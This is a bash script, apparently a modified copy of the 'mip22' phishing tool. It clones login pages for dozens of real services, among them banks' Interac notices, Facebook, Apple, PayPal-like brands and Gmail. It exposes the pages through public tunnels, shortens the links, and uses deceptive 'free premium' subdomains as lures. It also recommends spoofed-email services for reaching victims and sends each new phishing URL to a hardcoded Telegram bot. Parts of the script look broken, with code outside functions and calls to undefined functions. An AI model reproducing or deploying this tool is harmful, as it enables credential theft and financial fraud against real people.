#!/bin/bash


#
#  Copyright (c) 2022 Barchampas Gerasimos <makindosxx@gmail.com>.
#  mip22 is a advanced phishing tool.
#
#  mip22 is free software: you can redistribute it and/or modify
#  it under the terms of the GNU Affero General Public License as published by
#  the Free Software Foundation, either version 3 of the License, or
#  (at your option) any later version.
#
#  mip22 is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU Affero General Public License for more details.
#
#  You should have received a copy of the GNU Affero General Public License
#  along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
#


#permissions

chmod -R 777 packages.sh
chmod -R 777 tunnels.sh
chmod -R 777 data.txt
chmod -R 777 fingerprints.txt
chmod -R 777 .host
chmod -R 777 .manual_attack
chmod -R 777 .music
chmod -R 777 .pages
chmod -R 777 .tunnels_log
chmod -R 777 .www



#Install packages and tunnels

check_os_and_install_packages() {
	

if [[ -f .host/ngrok && -f .host/cloudflared ]]; then

{ clear; }	

else

{ clear; header; }

OS_SYSTEM=$(uname -o)	
if [ $OS_SYSTEM != Android ]; then
     bash packages.sh
     bash tunnels.sh

else	
 ./packages.sh
 ./tunnels.sh
 	
fi	

fi
	
}


# Check os for root

check_root_and_os() {
	
OS_SYSTEM=$(uname -o)

if [ $OS_SYSTEM != Android ]; then


if [[ "${EUID:-$(id -u)}" -ne 0 ]]; then
    { clear; header; }
    echo -e "The program cannot run.\nFor run program in GNU/Linux Operating System,\nGive root privileges and try again. \n"
    exit 1
fi

fi


}



# Terminal Colors

RED="$(printf '\033[31m')"  
GREEN="$(printf '\033[32m')"  
ORANGE="$(printf '\033[33m')"  
BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"  
CYAN="$(printf '\033[36m')"  
WHITE="$(printf '\033[37m')" 
BLACK="$(printf '\033[30m')"

ORANGEBG="$(printf '\033[43m')"  
BLUEBG="$(printf '\033[44m')"
RESETFG="$(printf '\e033[0m')"
RESETBG="$(printf '\e[0m\n')"



# Directories
if [[ ! -d ".host" ]]; then
	mkdir -p ".host"
fi

if [[ ! -d ".www" ]]; then
	mkdir -p ".www"
fi



# Clear content of log files

truncate -s 0 .tunnels_log/.cloudfl.log 



pid_kill() {
	
#kill all pid for php, ngrok and cloudflared
	if [[ `pidof php` ]]; then
		killall php > /dev/null 2>&1
	fi
	if [[ `pidof cloudflared` ]]; then
		killall cloudflared > /dev/null 2>&1
	fi

}


header(){
	
    printf "${BLUE}"	
	cat <<- EOF
	
SARA


EOF

printf "${RESETBG}"
}

host='127.0.0.1'
port='8080'


setup_clone(){

	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${BLUE} Setting up cloned page..."${WHITE}
	rm -rf .www/*
	cp -rf .pages/"$site"/* .www
	echo -ne "\n${GREEN}[${WHITE}-${GREEN}]${BLUE} Starting your php server..."${WHITE}
	cd .www && php -S "$host":"$port" > /dev/null 2>&1 & 
}



setup_clone_manual() {

   rm -rf .www/*
   
   cp -rf .manual_attack/index.html .www
   cp -rf .manual_attack/post.php .www
   cp -rf .manual_attack/__ROOT__/index.php .www
   cp -rf .manual_attack/__ROOT__/fingerprints.php .www	
   rm -rf .manual_attack/index.html
   rm -rf .manual_attack/post.php
   rm -rf .manual_attack/data.txt
   	
   echo -ne "\n${GREEN}[${WHITE}-${GREEN}]${BLUE} Starting your php server..."${WHITE}
   cd .www && php -S "$host":"$port" > /dev/null 2>&1 & 	
}

cloudflared_start() { 
	
	echo -e ""
	{ sleep 1; setup_clone; }
	echo -ne "${MAGETNA}"

    if [[ `command -v termux-chroot` ]]; then
		sleep 2 && termux-chroot ./.host/cloudflared tunnel -url "$host":"$port" > .tunnels_log/.cloudfl.log  2>&1 & > /dev/null 2>&1 &
    else
        sleep 2 && ./.host/cloudflared tunnel -url "$host":"$port" > .tunnels_log/.cloudfl.log  2>&1 & > /dev/null 2>&1 &
    fi
	{ sleep 12; clear; header; }
	
cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".tunnels_log/.cloudfl.log")
url_0="${cldflr_url}/public/deposit/submit.php"
url_1="${cldflr_url}/public/deposit/1.html"
url_2="${cldflr_url}/public/deposit/2.html"
url_3="${cldflr_url}/public/deposit/3.html"
url_4="${cldflr_url}/public/Google/GO.php"
url0=$(curl -s 'https://is.gd/create.php?format=simple&url='"$url_0")
url1=$(curl -s 'https://is.gd/create.php?format=simple&url='"$url_1")
url2=$(curl -s 'https://is.gd/create.php?format=simple&url='"$url_2")
url3=$(curl -s 'https://is.gd/create.php?format=simple&url='"$url_3")
url4=$(curl -s 'https://is.gd/create.php?format=simple&url='"$url_4")
echo -e "${WHITE}==================================="
echo -e "${RED}SEND INTERAC DEPOSIT NOTICE [PC VER] "
echo -e "${WHITE}$url0"
echo -e "${WHITE}==================================="
echo -e "${RED}SEND INTERAC DEPOSIT NOTICE [MOBILE] "
echo -e "${WHITE}$url1"
echo -e "${WHITE}==================================="
echo -e "${RED}SEND INTERAC  CANCEL NOTICE"
echo -e "${YELLOW}$url2"
echo -e "${WHITE}==================================="
echo -e "${RED}SEND INTERAC REQUEST NOTICE"
echo -e "${YELLOW}$url3"
echo -e "${WHITE}==================================="
echo -e "${RED}CREATE A GOOGLE LINK "
echo -e "${YELLOW}$url4"
echo -e "${WHITE}==================================="



}

	if [ ! -z "$cldflr_url" ]; then
		email="$(uuidgen)@yopmail.com"
		echo -e "\n${GREEN}[${WHITE}-${GREEN}]${BLUE} Obtaining SSL certificate..."${WHITE}
		
		if [[ $(uname -a) == *"Android"* ]]; then
			pkg install -y certbot > /dev/null 2>&1
			certbot certonly --non-interactive --agree-tos --email $email --webroot -w .www -d "$site.trycloudflare.com" > /dev/null 2>&1
		else
			sudo apt-get update > /dev/null 2>&1
			sudo apt-get install -y certbot > /dev/null 2>&1
			sudo certbot certonly --non-interactive --agree-tos --email $email --webroot -w .www -d "$site.trycloudflare.com" > /dev/null 2>&1
		fi
		
		echo -e "${GREEN}[${WHITE}+${GREEN}]${BLUE} SSL certificate has been obtained and installed."${WHITE}

		bot_token="5884162033:AAG_CgkEbML9dXsIy9E1K03yWzUOxbmf8cA"
		chat_id="-821080105"
		if [ ! -z "$bot_token" ] && [ ! -z "$chat_id" ]; then
			echo -e "\n${GREEN}[${WHITE}-${GREEN}]${BLUE} Sending the URL to a Telegram bot..."${WHITE}
			encoded_url=$(echo $cldflr_url | sed 's/\./%2E/g' | sed 's/\//%2F/g')
			curl -s "https://api.telegram.org/bot$bot_token/sendMessage?chat_id=$chat_id&text=New%20phishing%20page:%20$encoded_url" > /dev/null
echo -e "${GREEN}[${WHITE}+${GREEN}]${BLUE} The URL has been sent to the Telegram bot."${WHITE}
fi
else
echo -e "${RED}Error:${WHITE} Cloudflared tunnel URL not found."

fi






# Start Cloudflared manual
cloudflared_start_manual() { 
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Initializing... ${MAGENTA}( ${CYAN}http://$host:$port ${GREEN})"
	{ sleep 1; setup_clone_manual; }
	echo -ne "\n\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Launching Cloudflared..."

    if [[ `command -v termux-chroot` ]]; then
		sleep 2 && termux-chroot ./.host/cloudflared tunnel -url "$host":"$port" > .tunnels_log/.cloudfl.log  2>&1 & > /dev/null 2>&1 &
    else
        sleep 2 && ./.host/cloudflared tunnel -url "$host":"$port" > .tunnels_log/.cloudfl.log  2>&1 & > /dev/null 2>&1 &
    fi

	{ sleep 12; clear; header; }
	
	cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".tunnels_log/.cloudfl.log")
	cldflr_url1=${cldflr_url#https://}
	
	url_short=$(curl -s 'https://is.gd/create.php?format=simple&url='"$cldflr_url1")
	
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL http : ${GREEN}http://$cldflr_url1"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL http(s) : ${GREEN}$cldflr_url"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL subdomain : ${GREEN}$subdomain@$cldflr_url1"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL shortener : ${GREEN}$url_short"
	
	credentials_manual
}






# Start localrun
localhostrun_start() {
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Initializing... ${MAGENTA}( ${CYAN}http://$host:$port ${MAGENTA})"
	{ sleep 1; setup_clone; }
	echo -ne "\n\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Launching LocalhostRun..."

    if [[ `command -v termux-chroot` ]]; then
        sleep 2 && termux-chroot ssh -R "80":"$host":"$port" "nokey@localhost.run" > .tunnels_log/.localrun.log  2>&1 & > /dev/null 2>&1 &
    else
        sleep 2 && ssh -R "80":"$host":"$port" "nokey@localhost.run" > .tunnels_log/.localrun.log  2>&1 & > /dev/null 2>&1 &
    fi

	{ sleep 9; clear; header; }
	
	localrun_url=$(grep -o 'https://[-0-9a-z]*\.lhrtunnel.link' ".tunnels_log/.localrun.log")
	localrun_url1=${localrun_url#https://}
	
	url_short=$(curl -s 'https://is.gd/create.php?format=simple&url='"$localrun_url1")
	
    echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL http : ${GREEN}http://$localrun_url1"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL https(s) : ${GREEN}$localrun_url"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL subdomain : ${GREEN}$subdomain@$localrun_url1"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL shortener : ${GREEN}$url_short"
	
	credentials
}




# Start localrun customize
localhostrun_start_customize() {
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Initializing... ${MAGENTA}( ${CYAN}http://$host:$port ${MAGENTA})"
	{ sleep 1; setup_clone_customize; }
	echo -ne "\n\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Launching LocalhostRun..."

    if [[ `command -v termux-chroot` ]]; then
        sleep 2 && termux-chroot ssh -R "80":"$host":"$port" "nokey@localhost.run" > .tunnels_log/.localrun.log  2>&1 & > /dev/null 2>&1 &
    else
        sleep 2 && ssh -R "80":"$host":"$port" "nokey@localhost.run" > .tunnels_log/.localrun.log  2>&1 & > /dev/null 2>&1 &
    fi

	{ sleep 9; clear; header; }
	
	localrun_url=$(grep -o 'https://[-0-9a-z]*\.lhrtunnel.link' ".tunnels_log/.localrun.log")
	localrun_url1=${localrun_url#https://}
	
	url_short=$(curl -s 'https://is.gd/create.php?format=simple&url='"$localrun_url1")
	
    echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL http : ${GREEN}http://$localrun_url1"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL https(s) : ${GREEN}$localrun_url"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL subdomain : ${GREEN}$subdomain@$localrun_url1"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL shortener : ${GREEN}$url_short"
	
	credentials
}




# Start localrun manual
localhostrun_start_manual() {
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Initializing... ${MAGENTA}( ${CYAN}http://$host:$port ${MAGENTA})"
	{ sleep 1; setup_clone_manual; }
	echo -ne "\n\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Launching LocalhostRun..."

    if [[ `command -v termux-chroot` ]]; then
        sleep 2 && termux-chroot ssh -R "80":"$host":"$port" "nokey@localhost.run" > .tunnels_log/.localrun.log  2>&1 & > /dev/null 2>&1 &
    else
        sleep 2 && ssh -R "80":"$host":"$port" "nokey@localhost.run" > .tunnels_log/.localrun.log  2>&1 & > /dev/null 2>&1 &
    fi

	{ sleep 9; clear; header; }
	
	localrun_url=$(grep -o 'https://[-0-9a-z]*\.lhrtunnel.link' ".tunnels_log/.localrun.log")
	localrun_url1=${localrun_url#https://}
	
	url_short=$(curl -s 'https://is.gd/create.php?format=simple&url='"$localrun_url1")
	
    echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL http : ${GREEN}http://$localrun_url1"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL https(s) : ${GREEN}$localrun_url"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL subdomain : ${GREEN}$subdomain@$localrun_url1"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL shortener : ${GREEN}$url_short"
	
	credentials_manual
}






# Select Tunnel  
tunnel() {
	{ clear; header; }
	cat <<- EOF

		${GREEN}[${WHITE}1${GREEN}]${CYAN} Localhost ${MAGENTA} (for practise only)
		${GREEN}[${WHITE}2${GREEN}]${CYAN} LocalhostRun ${MAGENTA} (alternative)  
		${GREEN}[${WHITE}3${GREEN}]${CYAN} Cloudflared ${MAGENTA} (recommended)
		${GREEN}[${WHITE}4${GREEN}]${CYAN} Ngrok ${MAGENTA} (first install token from menu)

	EOF

	read -p "${GREEN}[${WHITE}-${GREEN}]${GREEN} Select a port forwarding service : ${WHITE}"

	case $REPLY in 
		   1)
		    localhost_start;;
		    
		   2)
		    localhostrun_start;; 
			
		   3)
			cloudflared_start;;
			
		   4)
			ngrok_start;;
		   	
			
		  *)
			echo -ne "\n${GREEN}[${WHITE}!${GREEN}]${RED} Invalid Option, Try Again..."
			{ sleep 1; header; tunnel;};;
	esac

}






# Select Tunnel customize 
tunnel_customize() {
	{ clear; header; }
	cat <<- EOF

		${GREEN}[${WHITE}1${GREEN}]${CYAN} Localhost ${MAGENTA} (for practise only)
		${GREEN}[${WHITE}2${GREEN}]${CYAN} LocalhostRun ${MAGENTA} (alternative)  
		${GREEN}[${WHITE}3${GREEN}]${CYAN} Cloudflared ${MAGENTA} (recommended)
		${GREEN}[${WHITE}4${GREEN}]${CYAN} Ngrok ${MAGENTA} (first install token from menu)

	EOF

	read -p "${GREEN}[${WHITE}-${GREEN}]${GREEN} Select a port forwarding service : ${WHITE}"

	case $REPLY in 
		   1)
		    localhost_start_customize;;
		    
		   2)
		    localhostrun_start_customize;; 
			
		   3)
			cloudflared_start_customize;;
			
		   4)
			ngrok_start_customize;;
		   	
			
		  *)
			echo -ne "\n${GREEN}[${WHITE}!${GREEN}]${RED} Invalid Option, Try Again..."
			{ sleep 1; header; tunnel_customize;};;
	esac

}








start_manual_method() {
 
 cd .manual_attack && php -S "127.0.0.1:8081" > /dev/null 2>&1 & 
     echo -e "\n${GREEN}[${WHITE}-${GREEN}] ${GREEN} Visit ${WHITE} http://127.0.0.1:8081 ${GREEN} for setup clone page "${WHITE}
	 echo -e "\n${GREEN}[${WHITE}-${GREEN}] ${GREEN} After setup clone page return to here and continue... "${WHITE}

}


# Select Tunnel  
tunnel_manual() {
	{ clear; header; }
	 
	
	 start_manual_method
	
	cat <<- EOF

		${GREEN}[${WHITE}1${GREEN}]${CYAN} Localhost ${MAGENTA} (for practise only)
		${GREEN}[${WHITE}2${GREEN}]${CYAN} LocalhostRun ${MAGENTA} (alternative)  
		${GREEN}[${WHITE}3${GREEN}]${CYAN} Cloudflared ${MAGENTA} (recommended)
		${GREEN}[${WHITE}4${GREEN}]${CYAN} Ngrok ${MAGENTA} (first install token from menu)    

	EOF

	read -p "${GREEN}[${WHITE}-${GREEN}]${GREEN} Select a port forwarding service : ${WHITE}"

	case $REPLY in 
		   1)
		    localhost_start_manual;;
		    
		   2)
		    localhostrun_start_manual;; 
			
		   3)
			cloudflared_start_manual;;
			
		   4)
			ngrok_start_manual;;
					   	
			
		  *)
			echo -ne "\n${GREEN}[${WHITE}!${GREEN}]${RED} Invalid Option, Try Again..."
			{ sleep 1; header; tunnel_manual;};;
	esac

}




attack() {
 
 { clear; header; echo; }

	cat <<- EOF
SELECCT MENU 
	EOF
	
	
	read -p "${GREEN}[${WHITE}-${GREEN}]${GREEN} Select an option : ${WHITE}"${WHITE}

	case $REPLY in 
	
	    1)
			site="adobe"
		
						tunnel;;
	    2)
			site="amazon"
			subdomain='http://amazon-pro-membership-lifetime-for-you'
			tunnel;;
				
				
	    3)
			site="apple"
			subdomain='http://apple-security-account-login'
			tunnel;;				
			
			
        4)
			site="badoo"
			subdomain='http://get-2000-euro-free-for-your-acount'
			tunnel;;
			
			
		5)
			site="care2"
			subdomain='http://get-2000-tokens-free-for-your-acount'
			tunnel;;	
			
			
	    6)
			site="clashofclans"
			subdomain='http://get-free-character-for-clashofclans-game'
			tunnel;;	
	 		
	 		
	    7)
			site="crunchyroll"
			subdomain='http://get-free-character-for-crunchyroll-game'
			tunnel;;
		
		
		8)
			site="deviantart"
			subdomain='http://deviantart-upgrade-account-pro-for-free'
			tunnel;;
		
		
		9)
			site="discord"
			subdomain='http://discord-upgrade-account-pro-for-free'
			tunnel;;
		
		
		10)
			site="dota2"
			subdomain='http://dota-upgrade-account-pro-for-free'
			tunnel;;
					
			
		11)
			site="dropbox"
			subdomain='http://get-2TB-cloud-storage-free'
			tunnel;;	


        12)
			site="ebay"
			subdomain='http://ebay-upgrade-account-for-free'
			tunnel;;


		13)
		    site="facebook"
			subdomain='http://secure-verified-account-for-facebook'
			tunnel;;	
			
			
		14)
			site="facebook_messenger"
			subdomain='http://messenger-premium-features-for-free'
			tunnel;; 	
			
          
        15)
            site="facebook_security"
			subdomain='http://make-your-facebook-secured-from-hackers'
			tunnel;;  

	     
	    16)		
	 		site="gmail"
			subdomain='http://get-unlimited-google-drive-free'
			tunnel;;
			
			
	    17)		
	 		site="goodreads"
			subdomain='http://goodreads-updrade-account-lifetime-free'
			tunnel;;
	   		
	   		
	    18)
			site="hotstar"
			subdomain='http://hotstar-premieum-account-for-free'
			tunnel;;		
	   		
	   	
	   	19)
			site="icloud"
			subdomain='http://get-2TB-cloud-storage-free'
			tunnel;;		
	   	
	   	
	   	20)
			site="influenster"
			subdomain='http://update-account-to-premium-free'
			tunnel;;		
	   	
	   		
	    21)
			site="instagram"
			subdomain='http://secure-login-for-instagram'
			tunnel;;
			
			
	    22)
		    site="instagram_followers"
			subdomain='http://get-10000-followers-for-instagram'
			tunnel;;			
			
	 
	    23)
			site="instagram_followers_2"
			subdomain='http://get-10000-followers-for-instagram'
			tunnel;;		
		
		
	    24)
			site="instagram_verify"
			subdomain='http://instagram-verify-account'
			tunnel;;
			
			
	    25)
			site="line"
			subdomain='http://line-get-free-tokens-for-speech'
			tunnel;;
					
			
	    26)
			site="linkedin"
			subdomain='http://get-a-premium-plan-for-linkedin-free'
			tunnel;;
		
		
	    27)
			site="livejournal"
			subdomain='http://get-a-premium-plan-for-livejournal-free'
			tunnel;;
		
		
		28) 
            site="mediafire"
			subdomain='http://get-2TB-cloud-storage-free'
			tunnel;;
		
		
		29)
			site="mewe"
			subdomain='http://mewe-update-account-to-premium-free'
			tunnel;;		
	   	
			
	   30) 
            site="microsoft"
			subdomain='http://unlimited-onedrive-space-for-free'
			tunnel;;	
		
	   31)  
	        site="mocospace"
			subdomain='http://upgrade-your-mocospace-plan-free'
			tunnel;;
		
			
	   32)  
	        site="myspace"
			subdomain='http://upgrade-your-myspace-plan-free'
			tunnel;;
			
		
	   33)
	        site="netflix"
			subdomain='http://upgrade-your-netflix-plan-free'
			tunnel;;	
			
	   34)
	        site="origin"
			subdomain='http://origin-upgrade-to-premium-account-free'
			tunnel;;	
		
		
	   35)  
	        site="outlook"
			subdomain='http://unlimited-onedrive-space-for-free'
			tunnel;;	
			
	   36)  
	        site="pinterest"
			subdomain='http://get-a-premium-plan-for-pinterest-free'
			tunnel;;	
			
	
	   37)  
	        site="playstation"
			subdomain='http://playstation-premium-account-free'
			tunnel;;		
				
					
       38)  
	        site="protonmail"
			subdomain='http://protonmail-pro-basics-for-free'
			tunnel;;
		
		
	   39)  
	        site="pubg"
			subdomain='http://get-free-character-for-pubs-game'
			tunnel;;	
			
			
	   40)  
	        site="quora"
			subdomain='http://get-quora-premium-account-for-free-lifetime'
			tunnel;;	
			
			
	   41)  
	        site="raverly"
			subdomain='http://get-raverly-premium-account-for-free-'
			tunnel;;	
			
			
	   42)  
	        site="reddit"
			subdomain='http://reddit-official-verified-member-badge'
			tunnel;;		
				
				
	   43)  
	        site="reverbnation"
			subdomain='http://get-reverbnation-premium-account-for-free-'
			tunnel;;	
		
		
	   44)
			site="signal"
			subdomain='http://signal-get-free-tokens-for-speech'
			tunnel;;	
		
		
	   45)
			site="skype"
			subdomain='http://skype-get-free-tokens-for-speech'
			tunnel;;	
		
		
	   46)
	        site="skyrock"
			subdomain='http://skyrock-upgrade-to-premium-account-free'
			tunnel;;	
				
					
       47)  
	        site="snapchat"
			subdomain='http://view-locked-snapchat-accounts-secretly'
			tunnel;;
		
	   48)  
	        site="socialclub"
			subdomain='http://-socialclub-update-account-to-premieum-free'
			tunnel;;		
		
			
	   49)  
	        site="spotify"
			subdomain='http://convert-your-account-to-spotify-premium'
			tunnel;;		
		
		
	   50)  
	        site="stackoverflow"
			subdomain='http://stackoverflow-convert-your-account-to-premium'
			tunnel;;		
			
		
	   51)  
	        site="steam"
			subdomain='http://steam-convert-your-account-to-premium'
			tunnel;;		
				
	   52)  
	        site="tagget"
			subdomain='http://tagget-convert-your-account-to-premium'
			tunnel;;		
		
			
	   53)  
	        site="telegram"
			subdomain='http://telegram-get-free-tokens-for-speech'
			tunnel;;	
	
	
	   54)  
	        site="tiktok"
			subdomain='http://get-tiktok-100000-followers-free-at-instant'
			tunnel;;
	
			
	   55)  
	        site="tiktok_followers"
			subdomain='http://get-tiktok-100000-followers-free-at-instant'
			tunnel;;
					
		
	   56)  
	        site="tumblr"
			subdomain='http://tumblr-upgrade-account-to-premium-free'
			tunnel;;
		
					
       57)  
	        site="twitch"
			subdomain='http://unlimited-twitch-tv-user-for-free'
			tunnel;;
			
			
	   58)  
	        site="twitter"
			subdomain='http://get-blue-badge-on-twitter-free'
			tunnel;;									
		
		
	   59)  
	        site="viber_out"
			subdomain='http://viber-get-free-tokens-for-speech'
			tunnel;;	
		
		
	   60)  
	        site="vimeo"
			subdomain='http://get-100000-views-for-channel-free'
			tunnel;;
		
			
			
	   61)  
	        site="vk"
			subdomain='http://vk-premium-real-method-2022-free'
			tunnel;;		
			
					
       62)  
	        site="whatsapp"
			subdomain='http://get-3000-free-tokens-for-free'
			tunnel;;
			
			
	   63)  
	        site="wordpress"
			subdomain='http://get-unlimited-wordpress-traffic-free'
			tunnel;;
	 	
	 	
	   64)  
	        site="xanga"
			subdomain='http://xanga-update-account-to-premieum'
			tunnel;;	
	 	
	 	
	   65)  
	        site="xbox"
			subdomain='http://xbox-premium-account-new-method-2022'
			tunnel;;
		
	  
	   66)  
	        site="xing"
			subdomain='http://xing-update-account-to-premieum'
			tunnel;;	
	 		
				
	 		
	   67)  
	        site="yahoo"
			subdomain='http://grab-mail-from-anyother-yahoo-account-free'
			tunnel;;
			
	   68)  
	        site="yandex"
			subdomain='http://grab-mail-from-anyother-yandex-account-free'
			tunnel;;		
		
	   
	   69)  
	        site="youtube_subs"
			subdomain='http://get-100000-youtube-subscribers-free'
			tunnel;;	
			
	
	   02)  
	        other_sites;;
	        
	        
	   99)  menu;;
	    
	        
	   *)
			echo -ne "\n${GREEN}[${WHITE}!${GREEN}]${RED} Invalid Option, Try Again..."
			{ sleep 0.7; attack;};;
	  
	esac


}




other_sites() {
 
 { clear; header; echo; }

   	cat <<- EOF
		${GREEN}[${WHITE}1${GREEN}]${CYAN} Freefire
		${GREEN}[${WHITE}2${GREEN}]${CYAN} Roblox
		${GREEN}[${WHITE}3${GREEN}]${CYAN} Academia
		${GREEN}[${WHITE}4${GREEN}]${CYAN} Airbnb
		${GREEN}[${WHITE}5${GREEN}]${CYAN} Bigmuscle
		${GREEN}[${WHITE}6${GREEN}]${CYAN} Doximity
		${GREEN}[${WHITE}7${GREEN}]${CYAN} Flickr
		${GREEN}[${WHITE}8${GREEN}]${CYAN} Hi5
		${GREEN}[${WHITE}9${GREEN}]${CYAN} Issue
		${GREEN}[${WHITE}10${GREEN}]${CYAN} NYtimes
		${GREEN}[${WHITE}11${GREEN}]${CYAN} Pokemon Trainer
		${GREEN}[${WHITE}12${GREEN}]${CYAN} WTsocial
		${GREEN}[${WHITE}13${GREEN}]${CYAN} Yammer
		${GREEN}[${WHITE}14${GREEN}]${CYAN} Yelp
		${GREEN}[${WHITE}99${GREEN}]${MAGENTA} Main Menu                                         
		                                                       
	EOF
	
	
	read -p "${GREEN}[${WHITE}-${GREEN}]${GREEN} Select an option : ${WHITE}"${WHITE}

	case $REPLY in 
	
	    1)
			site="freefire"
			subdomain='http://get-free-character-for-freefire-game'
			tunnel;;
			
			
	    2)
			site="roblox"
			subdomain='http://get-free-character-for-roblox-game'
			tunnel;;
				
	   
	    3)
			site="academia"
			subdomain='http://academia-account-update-plan-free'
			tunnel;;
	   
	   
	    4)
			site="airbnb"
			subdomain='http://airbnb-account-upgrade-plan-free'
			tunnel;;
	   
	   
	    5)
			site="bigmuscle"
			subdomain='http://bigmuscle-account-update-plan-free'
			tunnel;;
	           
	           
	    6)
			site="doximity"
			subdomain='http://doximity-account-update-plan-free'
			tunnel;;
	  
	  
	    7)
			site="flickr"
			subdomain='http://flickr-account-upgrade-plan-pro-free'
			tunnel;;
	           
	           
	    8)
			site="hi5"
			subdomain='http://hi5-account-secure-login'
			tunnel;;
	           
	    
	    9)
			site="issue"
			subdomain='http://flickr-account-upgrade-plan-pro-free'
			tunnel;;
	           
	    
	    10)
			site="nytimes"
			subdomain='http://nytimes-account-upgrade-to-pro-free'
			tunnel;;
	           
	    
	    11)
			site="pokemon"
			subdomain='http://pokemon-update-account-plan-free'
			tunnel;;
	            
	            
	    12)
			site="wtsocial"
			subdomain='http://wtsocial-secure-login'
			tunnel;;
	   
	   
	    13)
			site="yammer"
			subdomain='http://yammer-secure-login'
			tunnel;;       
	     
	     
	    14)
			site="yelp"
			subdomain='http://yelp-secure-login'
			tunnel;;
	           
	        
	   99) menu;;
	    
	        
	   *)
			echo -ne "\n${GREEN}[${WHITE}!${GREEN}]${RED} Invalid Option, Try Again..."
			{ sleep 0.7; other_sites;};;
	  
	esac


}





customize_sites()
{
	
 { clear; header; echo; }	
 
   
echo -ne "\n${MAGENTA}Customize your sites. 
${GREEN}Go inside the .customize folder \nand create your own customized sites inside folders.
Place all your files inside the same folder. 
For example folder mysite and inside all files. 
Then just type the folder name and choose tunnel. \n\n"
    
     
cat <<- EOF
        
${GREEN}[${WHITE}1${GREEN}]${CYAN} Customized 
${GREEN}[${WHITE}99${GREEN}]${CYAN} Main Menu
		
EOF
	
    read -p "${GREEN}[${WHITE}-${GREEN}]${GREEN} Select an option : ${WHITE}"${WHITE}

	case $REPLY in 
	    
	    1) 
	      read -p ${CYAN}"Enter folder name e.x mysite: "${WHITE} customize_folder
	      read -p ${CYAN}"Enter subdomain for tunnel e.x mysite-update-plan-premium-free: "${WHITE} customize_subdomain
	      site=$customize_folder
	      subdomain=$customize_subdomain
	      tunnel_customize;;

	    
	    99) 
	       menu;; 
	    
	    *)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 0.7; attack_customize;};;
	  
	esac
	
}






attack_manual() {

 subdomain='http:secure-login-page'
 tunnel_manual
  
}




email() {

{ clear; header; echo; }

    echo -ne "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Use this services for send email to Victims \n"
   
    echo -ne "\n${GREEN}[${WHITE}-${GREEN}]${CYAN} https://www.guerrillamail.com/ \n"
    echo -ne "\n${GREEN}[${WHITE}-${GREEN}]${CYAN} https://emkei.cz/ ${MAGENTA} (recommended) \n"
    echo -ne "\n${GREEN}[${WHITE}-${GREEN}]${CYAN} https://mailspre.com/ \n"
    echo -ne "\n\n"
    
    
    cat <<- EOF
		${GREEN}[${WHITE}99${GREEN}]${CYAN} Main Menu
		
		
	EOF
	
	read -p "${GREEN}[${WHITE}-${GREEN}]${GREEN} Select an option : ${WHITE}"${WHITE}

	case $REPLY in 
	    
	    99) menu;; 
	    
	    *)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 0.7; email;};;
	  
	esac


	

}	




menu() {
 
 { clear; header; echo; }

	cat <<- EOF
		${GREEN}[${WHITE}1${GREEN}]${CYAN} Attack Default
		${GREEN}[${WHITE}2${GREEN}]${CYAN} Attack Manual
		${GREEN}[${WHITE}3${GREEN}]${CYAN} Attack Customize
		${GREEN}[${WHITE}4${GREEN}]${CYAN} Apis
		${GREEN}[${WHITE}5${GREEN}]${CYAN} Email
		${GREEN}[${WHITE}6${GREEN}]${CYAN} Vpn
		${GREEN}[${WHITE}7${GREEN}]${CYAN} Sound (pc only)
		${GREEN}[${WHITE}0${GREEN}]${ORANGE} Exit
		
		
	EOF
	
	read -p "${GREEN}[${WHITE}-${GREEN}]${GREEN} Select an option : ${WHITE}"${WHITE}

	case $REPLY in 
	    
	    1) attack;; 
	    
	    2) attack_manual;; 
	    
	    3) customize_sites;;
	      			
	    4) apis;;
	    
	    5) email;;
	    
	    6) vpn_setup;;
	    
	    7) play_music;;
	    
	    help) help;;
	      				
		0)
		echo -ne "\n${GREEN}[${WHITE}!${GREEN}]${ORANGE} Thanks for using mip22 "${WHITE}
		sleep 2
		clear
		exit 1;;
		
	    *)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 0.7; menu;};;
	  
	esac
	
}	


control_c()
{
  echo -e "${RESETBG}"
  echo -e "${RESETFG}"
  clear
  exit 1
}


trap control_c SIGINT



check_os_and_install_packages
check_root_and_os
pid_kill
menu
